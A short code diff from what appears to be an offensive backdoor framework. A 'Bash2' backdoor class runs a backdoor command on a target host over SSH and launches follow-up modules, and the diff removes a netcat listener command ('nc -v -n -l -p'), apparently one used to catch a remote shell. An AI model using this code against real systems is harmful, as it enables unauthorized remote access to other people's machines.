@@ -24,7 +24,6 @@ class Bash2(Backdoor):
         target = self.core.curtarget
         print(GOOD + "Initializing backdoor...")
         target.ssh.exec_command(self.get_command())
-        os.system("nc -v -n -l -p " + str(port))
 
         for mod in self.modules.keys():
             print(INFO + "Attempting to execute " + mod.name + " module...")
